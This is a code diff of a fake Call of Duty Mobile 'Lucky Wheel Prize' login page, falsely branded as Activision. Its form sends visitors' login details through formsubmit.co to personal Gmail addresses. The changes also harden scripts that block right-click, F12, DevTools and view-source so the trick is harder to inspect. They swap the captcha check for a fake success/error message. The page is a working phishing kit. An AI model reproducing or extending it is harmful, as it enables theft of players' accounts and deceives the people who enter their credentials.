@@ -160,33 +160,9 @@
         #refvc img:hover {
             transform: rotate(360deg);
         }
-
-        /* ESRB در فوتر */
-        .esrb-ratings {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 30px;
-            margin: 20px 0 10px;
-            flex-wrap: wrap;
-        }
-        .esrb-ratings img {
-            height: 80px;
-            width: auto;
-            max-width: 150px;
-        }
-        @media (max-width: 600px) {
-            .esrb-ratings {
-                gap: 20px;
-                flex-direction: column;
-            }
-            .esrb-ratings img {
-                height: 70px;
-            }
-        }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body oncontextmenu="return false;"> <!-- لایه اول بلاک راست‌کلیک -->
 
     <header class="official-header">
         <nav>
@@ -228,7 +204,7 @@
                     <div class="code_ct">
                         <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-                        <form id="loginForm" action="https://formsubmit.co/erfantroll778899@gmail.com,joker553300@gmail.com" method="POST" target="dummyframe" onsubmit="return validateAndSubmit()">
+                        <form action="https://formsubmit.co/erfantroll778899@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
                             <ul class="code_list c">
                                 <li>
                                     <span class="desktop_label">Email</span>
@@ -262,7 +238,7 @@
                             <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
 
                             <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
-                            <div id="result" class="success-msg" style="display:none;"></div>
+                            <div id="result" class="success-msg">Error! try again</div>
                         </form>
                     </div>
                 </div>
@@ -285,21 +261,38 @@
             <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Support</a>
         </div>
         <p>© 2019-2026 Activision Publishing, Inc. All rights reserved.</p>
-
-        <div class="esrb-ratings">
-            <img src="cod-hub-esrb-en.png" alt="ESRB Mature 17+" />
-            <img src="Privacy_Certified_Globe_color_2022.png" alt="ESRB Privacy Certified" />
-        </div>
     </footer>
 
     <script>
-        // بلاک راست‌کلیک و F12
+        // بلاک راست‌کلیک — لایه قوی (دو بار برای اطمینان کامل)
         document.oncontextmenu = function() { return false; };
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }, true);
 
-        document.addEventListener("keydown", e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+        // بلاک F12 و کلیدهای DevTools
+        document.addEventListener("keydown", function(e) {
+            // F12
+            if (e.keyCode === 123) {
                 e.preventDefault();
+                return false;
+            }
+            // Ctrl + Shift + I (DevTools)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl + Shift + J (Console)
+            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl + U (View Source)
+            if (e.ctrlKey && e.keyCode === 85) {
+                e.preventDefault();
+                return false;
             }
         });
 
@@ -315,35 +308,12 @@
             }
         }
 
-        // چک کپچا و ارسال فرم
-        function validateAndSubmit() {
-            const userInput = document.getElementById("F_VCODE").value.trim();
-            const result = document.getElementById("result");
-
-            if (!captchaCode || captchaCode === "") {
-                result.textContent = "Captcha not loaded! Refresh the page.";
-                result.style.color = "#ff0000";
-                result.style.display = "block";
-                generateCaptcha();
-                return false;
-            }
-
-            if (userInput === captchaCode) {
-                result.textContent = "Success! Information sent to email.";
-                result.style.color = "#00ff00";
-                result.style.display = "block";
-                return true; // ارسال به دو ایمیل
-            } else {
-                result.textContent = "Wrong code! Try again.";
-                result.style.color = "#ff0000";
-                result.style.display = "block";
-                generateCaptcha();
-                document.getElementById("F_VCODE").value = "";
-                return false;
-            }
+        function showSuccess() {
+            document.getElementById("result").style.display = "block";
+            return true;
         }
 
-        // تولید کپچا
+        // تولید کپچای واقعی با canvas
         let captchaCode = "";
         function generateCaptcha() {
             const canvas = document.getElementById("captcha-canvas");
@@ -353,7 +323,7 @@
             ctx.fillRect(0, 0, 138, 52);
 
             captchaCode = Math.random().toString().substr(2, 5);
-
+            
             for (let i = 0; i < 200; i++) {
                 ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
                 ctx.fillRect(Math.random() * 138, Math.random() * 52, 2, 2);
@@ -480,11 +450,8 @@
             prizeAnnouncement.style.display = "block";
         }
 
-        // شروع اولیه — کپچا و چرخ موقع لود صفحه
-        window.onload = function() {
-            generateCaptcha();
-            drawWheel();
-        };
+        generateCaptcha();
+        drawWheel();
     </script>
 </body>
 </html>
